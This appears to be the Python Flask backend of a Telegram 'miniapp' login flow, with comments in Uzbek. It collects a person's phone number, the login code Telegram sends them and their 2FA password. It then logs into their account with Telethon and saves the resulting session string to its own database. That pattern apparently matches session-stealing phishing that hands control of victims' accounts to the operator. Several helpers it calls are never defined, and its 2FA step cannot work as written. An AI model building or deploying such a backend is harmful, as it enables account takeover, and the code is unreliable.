# login_api.py
import os
import asyncio
import time
from flask import Flask, request, jsonify, render_template

from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.sessions import StringSession

from database import (
    get_db,
    save_session,
    save_login_code,
    get_login_code,
    delete_login_code
)

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

app = Flask(__name__)

# =========================
# SEND CODE
# =========================
@app.route("/send_code", methods=["POST"])
def send_code():
    phone = request.json.get("phone")

    async def _send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        session_str = client.session.save()
        await client.disconnect()
        return session_str

    try:
        session_str = asyncio.run(_send())
    except Exception as e:
        # ❌ agar bu joyga tushsa — SMS ham KELMAGAN bo‘ladi
        print("SEND_CODE FAILED:", e)
        return jsonify({
            "status": "error",
            "message": "Kod yuborilmadi"
        })

    # 🔥 MUHIM: BU JOYDA ENDI XATO BO‘LSA HAM SMS ALLAQACHON YUBORILGAN
    try:
        save_temp_session(phone, session_str)
    except Exception as e:
        # faqat log qilamiz
        print("SAVE TEMP SESSION ERROR:", e)

    # 🔥 FRONTENDGA DOIM OK QAYTARAMIZ
    return jsonify({
        "status": "ok",
        "message": "Kod yuborildi"
    })
# =========================
# VERIFY CODE
# =========================
from telethon.errors import (
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError
)

@app.route("/verify_code", methods=["POST"])
def verify_code():
    phone = request.json.get("phone")
    code = request.json.get("code")

    session_str = get_temp_session(phone)
    if not session_str:
        return jsonify({
            "status": "error",
            "message": "Kod eskirgan, qayta yuboring"
        })

    async def _verify():
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(phone=phone, code=code)
        except PhoneCodeInvalidError:
            await client.disconnect()
            return ("error", "Kod noto‘g‘ri")
        except PhoneCodeExpiredError:
            await client.disconnect()
            return ("error", "Kod eskirgan")
        except SessionPasswordNeededError:
            # 2FA holati — BU XATO EMAS
            final_session = client.session.save()
            await client.disconnect()
            return ("2fa", final_session)

        me = await client.get_me()
        final_session = client.session.save()
        await client.disconnect()
        return ("ok", me, final_session)

    try:
        import asyncio
        loop = asyncio.get_event_loop()
        result = loop.run_until_complete(_verify())
    except Exception as e:
        print("VERIFY_CODE CRASH:", e)
        return jsonify({
            "status": "error",
            "message": "Server xatosi"
        })

    # ===== NATIJANI TARTIB BILAN QAYTARAMIZ =====

    if result[0] == "error":
        return jsonify({
            "status": "error",
            "message": result[1]
        })

    if result[0] == "2fa":
        # vaqtinchalik sessionni 2FA uchun saqlab qolamiz
        save_temp_session(phone, result[1])
        return jsonify({"status": "2fa_required"})

    # OK holat
    _, me, session_str = result
    save_session(me.id, session_str)
    delete_temp_session(phone)

    return jsonify({"status": "ok"})
    
# =========================
# VERIFY PASSWORD (2FA)
# =========================
@app.route("/verify_password", methods=["POST"])
def verify_password():
    password = request.json.get("password")

    async def _verify():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(password=password)

        me = await client.get_me()
        session_str = client.session.save()

        await client.disconnect()
        return me, session_str

    try:
        me, session_str = asyncio.run(_verify())
        save_session(me.id, session_str)
        return jsonify({"status": "ok"})
    except Exception:
        return jsonify({"status": "error", "message": "Parol noto‘g‘ri"})


@app.route("/miniapp")
def miniapp():
    return render_template("login.html")
